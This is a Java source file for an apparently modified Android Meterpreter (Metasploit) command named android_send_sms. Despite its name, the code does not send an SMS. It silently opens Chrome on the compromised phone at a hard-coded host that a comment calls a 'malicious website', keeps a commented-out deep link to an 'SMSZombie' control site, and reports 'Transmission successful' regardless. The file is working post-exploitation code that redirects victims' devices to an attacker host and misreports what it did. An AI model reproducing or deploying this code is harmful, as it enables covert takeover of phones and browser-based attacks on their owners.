package com.metasploit.meterpreter.android;

import android.telephony.SmsManager;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;
import android.net.Uri;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import java.net.URISyntaxException;
import java.util.List;

public class android_send_sms implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_SMS_ADDRESS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9001);
    private static final int TLV_TYPE_SMS_BODY = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9002);
    private static final int TLV_TYPE_SMS_SR = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9021);
    private static final int TLV_TYPE_SMS_DR = TLVPacket.TLV_META_TYPE_BOOL
            | (TLV_EXTENSIONS + 9026);

    Object SMSstatus = new Object();
    Object SMSdelivered = new Object();
    String resultSent, resultDelivered;

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        String number = request.getStringValue(TLV_TYPE_SMS_ADDRESS);
        String message = request.getStringValue(TLV_TYPE_SMS_BODY);
        boolean dr = request.getBooleanValue(TLV_TYPE_SMS_DR);
        SmsManager sm = SmsManager.getDefault();
        String SMS_SENT = "SMS_SENT";
        String SMS_DELIVERED = "SMS_DELIVERED";

        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();



       /* Android Q poses limitations on starting activities
        *
        * https://developer.android.com/guide/components/activities/background-starts
        */

        /*
        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
        try {
            Intent intent = new Intent("android.intent.action.VIEW",
                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            resultSent = "Transmission successful";
            resultDelivered = "Transmission successful";

        } catch (ActivityNotFoundException e) {
            resultSent = e.getMessage();
            resultDelivered = e.getMessage();
        }
        */

        // Issue Chrome intent to malicious website
        String urlString = "http://192.168.1.134:1312";
        Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(urlString));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setPackage("com.android.chrome");
        try {
            context.startActivity(intent);
            resultSent = "Transmission successful";
            resultDelivered = "Transmission successful";
        } catch (ActivityNotFoundException ignored) {
          resultSent = "Chrome app not installed";
          resultDelivered = "Chrome app not installed";
        }

        response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
        response.addOverflow(TLV_TYPE_SMS_SR,resultDelivered);

        return ERROR_SUCCESS;
    }
}
